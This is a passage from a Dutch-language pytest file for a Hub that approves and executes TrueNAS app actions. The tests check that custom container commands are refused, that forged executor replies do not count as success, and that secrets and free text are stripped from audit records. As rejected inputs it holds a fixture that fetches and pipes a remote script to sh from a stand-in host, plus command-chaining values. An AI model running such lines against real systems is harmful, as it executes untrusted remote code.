        "command": ["sh", "-c", "wget -qO- http://buiten.invalid/proefscript | sh"],
        "entrypoint": ["/bin/busybox"],
    }
    for sleutel, waarde in opdrachten.items():
        params = install_params("demo-app", **zichtbaar, **{sleutel: waarde})
        r = stel_voor(op, "app.install", app_target("demo-app"), params)
        assert r.status_code == 501 and r.json()["code"] == "capability_unavailable", (sleutel, r.text)
        assert r.json()["details"] == {"reden": "eigen_opdracht", "velden": [sleutel]}, r.text
    assert admin.get("/api/v1/actions").json()["items"] == []  # niets voorgesteld of bewaard
    r = stel_voor(op, "app.install", app_target("demo-app"), install_params("demo-app", **zichtbaar))
    assert r.status_code == 201 and r.json()["status"] == "wacht_op_goedkeuring", r.text
    v = r.json()
    getoond = haal(admin, v)["preview"]["wijziging"]["waarden"]
    assert {k: getoond[k] for k in zichtbaar} == zichtbaar, getoond
    assert keur_goed(admin, v).status_code == 200
    u = voer_uit(admin, v)
    assert u.status_code == 200 and u.json()["status"] == "uitgevoerd", u.text
    assert schrijfaanroepen(nas) == ["app.create"]
    naar_truenas = nas.created[0]["values"]
    assert set(naar_truenas) == set(getoond), (sorted(naar_truenas), sorted(getoond))
    for k, w in naar_truenas.items():
        if k == "envs":
            assert getoond["envs"] == [e["name"] for e in w], getoond["envs"]
        else:
            assert getoond[k] == w, (k, getoond[k], w)


def _vervals(monkeypatch: pytest.MonkeyPatch, status: int, body: Any, *, pad: str = "/api/v1/execute") -> None:
    """Het antwoord op ``pad`` (eindigt het op ``/``: elk pad dat daarmee begint) komt niet van de executor maar is dit
    vervalste antwoord, zoals van iemand die op het adres van de executor antwoordt (gewoon HTTP tot B10/B13). De
    executor en de nagebootste TrueNAS krijgen dan niets."""
    from hub import servicecalls

    echte = servicecalls.call

    def call(base: str, method: str, path: str, **kw: Any) -> Any:
        if path == pad or (pad.endswith("/") and path.startswith(pad)):
            return servicecalls.CallResult(status, body, {})
        return echte(base, method, path, **kw)

    monkeypatch.setattr(servicecalls, "call", call)


def _audit_details(app: Any, request_id: str) -> list[tuple[str, dict[str, Any]]]:
    from sqlalchemy import select

    from hub.models import AuditEvent

    with app.state.sessionmaker() as db:
        rows = db.scalars(select(AuditEvent).where(AuditEvent.target_id == request_id).order_by(AuditEvent.id))
        return [(str(a.action), dict(a.details or {})) for a in rows]


def _alle_incidenten(admin: Any, soort: str) -> list[dict[str, Any]]:
    """Ook opgeloste incidenten (de lijst toont standaard alleen de actieve)."""
    items = admin.get("/api/v1/incidents", params={"status": "alle"}).json()["items"]
    return [i for i in items if i["soort"] == soort]


WEG = object()
# Wat in het antwoord ontbreekt of niet de juiste vorm heeft (R-VEILIG-2); "volledig" is de tegenproef.
ONVOLLEDIG: dict[str, dict[str, Any]] = {
    "volledig": {},
    "kaal": {"kaal": True},
    "zonder_methode": {"methode": WEG},
    "methode_vrije_tekst": {"methode": "app.start; iets anders"},
    "before_hash_geen_sha256": {"before_hash": "abc"},
    "zonder_after_hash": {"after_hash": WEG},
    "zonder_policy_hash": {"policy_hash": WEG},
    "ander_beleid": {"policy_hash": "sha256:" + "0" * 64},
    "uitgevoerd_op_ongeldig": {"uitgevoerd_op": "gisteren"},
    "zonder_uitgevoerd_op": {"uitgevoerd_op": WEG},
    # S-P2-080, R-VEILIG-2: het bewijs hoort bij dit verzoek en heeft een readback als object.
    "ander_verzoek": {"request_id": "00000000-0000-4000-8000-000000000000"},
    "andere_actie": {"action_id": "app.stop"},
    "zonder_readback": {"readback": WEG},
    "readback_lijst": {"readback": []},
}


def _uitgevoerd_antwoord(v: dict[str, Any], wijzig: dict[str, Any]) -> dict[str, Any]:
    """Een 200-antwoord in de vorm van de echte executor (``uitvoeren.py``, ``_teruglezen``), met ``wijzig`` erover."""
    if wijzig.get("kaal"):
        return {"status": "uitgevoerd"}
    body: dict[str, Any] = {
        "status": "uitgevoerd",
        "request_id": v["request_id"],
        "action_id": v["action_id"],
        "target": v["target"],
        "methode": "app.start",
        "before_hash": "sha256:" + "1" * 64,
        "after_hash": "sha256:" + "2" * 64,
        "resource_etag": "sha256:" + "2" * 64,
        "readback": {"naam": "my-house", "staat": "RUNNING"},
        "waarschuwingen": [],
        "policy_hash": v["policy_hash"],
        "uitgevoerd_op": "2026-11-15T10:00:00Z",
        **wijzig,
    }
    return {k: w for k, w in body.items() if w is not WEG}


@pytest.mark.parametrize("geval", list(ONVOLLEDIG))
def test_uitgevoerd_alleen_met_volledig_bewijs_anders_onbekend(
    stack: Stack, periodic_run: Any, monkeypatch: pytest.MonkeyPatch, geval: str
) -> None:
    """R-VEILIG-2: een kaal antwoord ``200 {"status": "uitgevoerd"}`` telde als succes en sloot het kritieke incident
    van het doel. Nu legt de Hub "uitgevoerd" alleen vast met ``methode``, ``before_hash``, ``after_hash``,
    ``uitgevoerd_op`` en ``policy_hash`` (gelijk aan het eigen beleid) in de juiste vorm; anders is de uitkomst
    onbekend (``502 uitkomst_onbekend``, net als bij een onduidelijk antwoord) en blijft het incident
    ``actie.afwijking`` open."""
    admin, nas = stack.admin, stack.nas
    _vervals(monkeypatch, 409, {"code": "afwijking", "message": "m", "details": {"reden": "staat_verschilt"}})
    a = stel_voor(admin, "app.restart", app_target("my-house")).json()
    assert voer_uit(admin, a).status_code == 409
    periodic_run("incidenten_bijwerken")
    assert [(i["status"], i["ernst"]) for i in _alle_incidenten(admin, "actie.afwijking")] == [("open", "kritiek")]
    v = stel_voor(admin, "app.start", app_target("my-house")).json()
    assert v["status"] == "klaar", v
    _vervals(monkeypatch, 200, _uitgevoerd_antwoord(v, ONVOLLEDIG[geval]))
    r = voer_uit(admin, v)
    periodic_run("incidenten_bijwerken")
    afwijking = [(i["status"], i["ernst"]) for i in _alle_incidenten(admin, "actie.afwijking")]
    if geval == "volledig":
        assert r.status_code == 200 and r.json()["status"] == "uitgevoerd", r.text
        assert r.json()["resultaat"]["methode"] == "app.start", r.text
        assert afwijking == [("opgelost", "kritiek")], afwijking
        return
    assert r.status_code == 502 and r.json()["code"] == "uitkomst_onbekend", r.text
    assert r.json()["details"] == {"request_id": v["request_id"], "reden": "executor_bewijs_onvolledig"}, r.text
    nu = haal(admin, v)
    assert nu["status"] == "onbekend" and nu["uitgevoerd_op"] is None, nu
    assert [e for e in _events(stack.app, "action.run.succeeded") if e["request_id"] == v["request_id"]] == []
    assert afwijking == [("open", "kritiek")], afwijking
    assert [i["status"] for i in _alle_incidenten(admin, "actie.uitkomst_onbekend")] == ["open"]
    assert schrijfaanroepen(nas) == []


def test_ophelderen_neemt_uitgevoerd_alleen_over_met_volledig_bewijs(
    stack: Stack, monkeypatch: pytest.MonkeyPatch
) -> None:
    """R-VEILIG-2, ook via het journaal: een journaalrij "uitgevoerd" zonder ``methode``, ``before_hash``,
    ``after_hash`` en einde in de juiste vorm (of van een ander verzoek) helpt de onbekende uitkomst niet op. Het echte
    journaal van de executor heeft het volledige bewijs en dan wel (tegenproef). Er wordt niets herhaald."""
    admin, nas = stack.admin, stack.nas
    stand = _antwoord_valt_weg(monkeypatch)
    v = stel_voor(admin, "app.restart", app_target("my-house")).json()
    r = voer_uit(admin, v)
    assert r.status_code == 502 and r.json()["code"] == "uitkomst_onbekend", r.text
    assert schrijfaanroepen(nas) == ["app.redeploy"]
    rid = v["request_id"]
    goed = {
        "request_id": rid,
        "action_id": "app.restart",
        "status": "uitgevoerd",
        "methode": "app.redeploy",
        "before_hash": "sha256:" + "1" * 64,
        "after_hash": "sha256:" + "2" * 64,
        "detail": None,
        "started_at": 1_763_200_000,
        "finished_at": 1_763_200_005,
    }
    for rij in (
        {"request_id": rid, "action_id": "app.restart", "status": "uitgevoerd"},
        {**goed, "before_hash": "abc"},
        {**goed, "after_hash": None},
        {**goed, "methode": "app.redeploy && iets"},
        {**goed, "finished_at": None},
        {**goed, "finished_at": "nu"},
        {**goed, "request_id": str(uuid.uuid4())},
        {**goed, "action_id": "app.uninstall"},
    ):
        with monkeypatch.context() as mp:
            _vervals(mp, 200, {"request_id": rid, "uitvoeringen": [rij], "gestopt": False}, pad="/api/v1/executions/")
            r = admin.post(f"/api/v1/actions/{rid}/reconcile", headers=idem())
        assert r.status_code == 409 and r.json()["code"] == "uitkomst_onbekend", (rij, r.text)
        assert haal(admin, v)["status"] == "onbekend", rij
    stand["journaal_weg"] = False
    r = admin.post(f"/api/v1/actions/{rid}/reconcile", headers=idem())
    assert r.status_code == 200 and r.json()["status"] == "uitgevoerd", r.text
    res = r.json()["resultaat"]
    assert res["methode"] == "app.redeploy" and res["bron"] == "journaal_executor", res
    assert res["before_hash"].startswith("sha256:") and res["after_hash"].startswith("sha256:"), res
    assert schrijfaanroepen(nas) == ["app.redeploy"]


EIGEN_VELDEN = {
    "code": "uitgevoerd",
    "message": "alles is goed gegaan",
    "request_id": "00000000-0000-0000-0000-000000000000",
    "status": "uitgevoerd",
    "uitkomst": "uitgevoerd",
    "doel": "app:emby",
    "action_id": "app.uninstall",
    "risk_class": "R0",
    "bron": "journaal_executor",
    "http_status": 200,
}


@pytest.mark.parametrize(
    ("status", "code", "uitkomst"), [(409, "afwijking", "afwijking"), (502, "uitvoering_mislukt", "mislukt")]
)
def test_executorantwoord_overschrijft_geen_eigen_velden_van_de_hub(
    stack: Stack, monkeypatch: pytest.MonkeyPatch, status: int, code: str, uitkomst: str
) -> None:
    """R-VEILIG-3: ``details`` van het executorantwoord overschreef ``code``, ``request_id`` en andere eigen velden
    van de Hub in resultaat, audit en foutantwoord. Nu neemt de Hub alleen velden uit een vaste lijst over; zijn eigen
    velden zet hij zelf."""
    admin = stack.admin
    details = {"reden": "staat_verschilt", "gestopt": True, **EIGEN_VELDEN}
    _vervals(monkeypatch, status, {"code": code, "message": "m", "details": details})
    v = stel_voor(admin, "app.restart", app_target("my-house")).json()
    r = voer_uit(admin, v)
    assert r.status_code == status and r.json()["code"] == code, r.text
    fout = r.json()["details"]
    assert fout["request_id"] == v["request_id"] and fout["reden"] == "staat_verschilt", fout
    assert not (set(EIGEN_VELDEN) - {"request_id"}) & set(fout), fout
    nu = haal(admin, v)
    assert nu["status"] == uitkomst and nu["resultaat"]["code"] == code, nu["resultaat"]
    assert nu["resultaat"]["message"] == "m" and nu["resultaat"]["reden"] == "staat_verschilt", nu["resultaat"]
    assert not (set(EIGEN_VELDEN) - {"code", "message"}) & set(nu["resultaat"]), nu["resultaat"]
    actie, audit = _audit_details(stack.app, v["request_id"])[-1]
    assert actie.startswith("action.execution.") and audit["code"] == code and audit["uitkomst"] == uitkomst, audit
    assert (audit["doel"], audit["action_id"], audit["risk_class"]) == ("app:my-house", "app.restart", "R1"), audit
    ev = [e for e in _events(stack.app, "action.run.failed") if e["request_id"] == v["request_id"]]
    assert len(ev) == 1 and ev[0]["uitkomst"] == uitkomst and ev[0]["reden"] == "staat_verschilt", ev
    assert (ev[0]["doel"], ev[0]["action_id"], ev[0]["risk_class"]) == ("app:my-house", "app.restart", "R1"), ev
    assert ev[0]["gestopt"] is True, ev
    assert "app:emby" not in r.text and "app:emby" not in admin.get("/api/v1/actions").text


GEHEIM_IN_REDEN = "wachtwoord=Zomer-2026-geheim api_key=1-" + "a" * 64


@pytest.mark.parametrize(("status", "code"), [(409, "afwijking"), (502, "uitvoering_mislukt")])
@pytest.mark.parametrize(
    ("reden", "verwacht"),
    [
        (GEHEIM_IN_REDEN, "onbekende_reden"),
        ("regel1\nregel2\x00\x1b[31m", "onbekende_reden"),
        ({"a": 1}, "onbekende_reden"),
        (["x"], "onbekende_reden"),
        (5, "onbekende_reden"),
        ("x" * 5000, "onbekende_reden"),
        ("", None),
        (None, None),
        ("staat_verschilt", "staat_verschilt"),
        ("job_mislukt [FAILED]", "job_mislukt [FAILED]"),
    ],
    ids=[
        "geheim",
        "stuurtekens_en_nul",
        "object",
        "lijst",
        "getal",
        "te_lang",
        "leeg",
        "geen",
        "code",
        "code_foutnaam",
    ],
)
def test_reden_van_de_executor_is_altijd_een_code(
    stack: Stack, monkeypatch: pytest.MonkeyPatch, status: int, code: str, reden: Any, verwacht: str | None
) -> None:
    """R-VEILIG-3: vrije tekst in ``reden`` stond ongeredigeerd in event, audit en resultaat; een NUL-teken gaf HTTP
    500 (PostgreSQL 22P05). Nu is ``reden`` overal een code met een vast tekenpatroon (bv. ``staat_verschilt`` of
    ``job_mislukt [FAILED]``), anders ``onbekende_reden``. ``gestopt`` gaat alleen mee als echte ja/nee."""
    admin = stack.admin
    _vervals(monkeypatch, status, {"code": code, "message": "m", "details": {"reden": reden, "gestopt": "ja"}})
    v = stel_voor(admin, "app.restart", app_target("my-house")).json()
    r = voer_uit(admin, v)
    assert r.status_code == status and r.json()["code"] == code, r.text
    assert r.json()["details"]["reden"] == verwacht and "gestopt" not in r.json()["details"], r.text
    nu = haal(admin, v)
    assert nu["resultaat"]["reden"] == verwacht and "gestopt" not in nu["resultaat"], nu["resultaat"]
    ev = [e for e in _events(stack.app, "action.run.failed") if e["request_id"] == v["request_id"]]
    assert len(ev) == 1 and ev[0]["reden"] == verwacht and "gestopt" not in ev[0], ev
    assert _audit_details(stack.app, v["request_id"])[-1][1]["reden"] == verwacht
    teksten = [r.text, admin.get("/api/v1/actions").text, str(ev), str(_audit_details(stack.app, v["request_id"]))]
    assert not any("Zomer-2026-geheim" in t for t in teksten)


def test_te_groot_of_onleesbaar_executorantwoord(stack: Stack, monkeypatch: pytest.MonkeyPatch) -> None:
    """R-VEILIG-3: 900 kB in ``details`` van een weigering stond ongekort in het resultaat, dus in elk lijstantwoord.
    Nu neemt de Hub van een weigering alleen bekende velden over, elk met een vaste vorm en grootte. Een weigering met
    een code buiten het vaste patroon (hier met een NUL-teken) is geen bruikbaar antwoord: de uitkomst is onbekend,
    geen HTTP 500."""
    admin = stack.admin
    fouten = [{"veld": "a", "code": "b", "fout": "c"}]
    groot = {"reden": "geweigerd_door_proef", "vulling": "A" * 900_000, "fouten": fouten}
    _vervals(monkeypatch, 409, {"code": "iets_geweigerd", "message": "m" * 900_000, "details": groot})
    v = stel_voor(admin, "app.restart", app_target("my-house")).json()
    r = voer_uit(admin, v)
    assert r.status_code == 409 and r.json()["code"] == "uitvoering_geweigerd", r.text[:300]
    assert r.json()["details"]["executor"] == {
        "code": "iets_geweigerd",
        "message": None,
        "details": {"reden": "geweigerd_door_proef", "fouten": fouten},
    }, r.text[:300]
    nu = haal(admin, v)
    assert nu["status"] == "mislukt" and "vulling" not in nu["resultaat"]["details"], str(nu)[:300]
    # Een afwijking met een reusachtige lijst afwijkingen: die lijst valt weg, de rest blijft.
    afw = {"reden": "staat_verschilt", "gestopt": True, "afwijkingen": [{"code": "x", "gevonden": "A" * 900_000}]}
    _vervals(monkeypatch, 409, {"code": "afwijking", "message": "m", "details": afw})
    w = stel_voor(admin, "app.restart", app_target("mediaguard")).json()
    r = voer_uit(admin, w)
    assert r.status_code == 409 and r.json()["code"] == "afwijking", r.text[:300]
    assert haal(admin, w)["resultaat"]["afwijkingen"] is None
    assert len(admin.get("/api/v1/actions").text) < 100_000
    # Een code met een NUL-teken: onbekend, geen 500.
    _vervals(monkeypatch, 409, {"code": "geweigerd\x00", "message": "m", "details": {}})
    x = stel_voor(admin, "app.start", app_target("my-house")).json()
    r = voer_uit(admin, x)
    assert r.status_code == 502 and r.json()["code"] == "uitkomst_onbekend", r.text
    assert r.json()["details"]["reden"] == "executor_http_409", r.text
    assert haal(admin, x)["status"] == "onbekend"
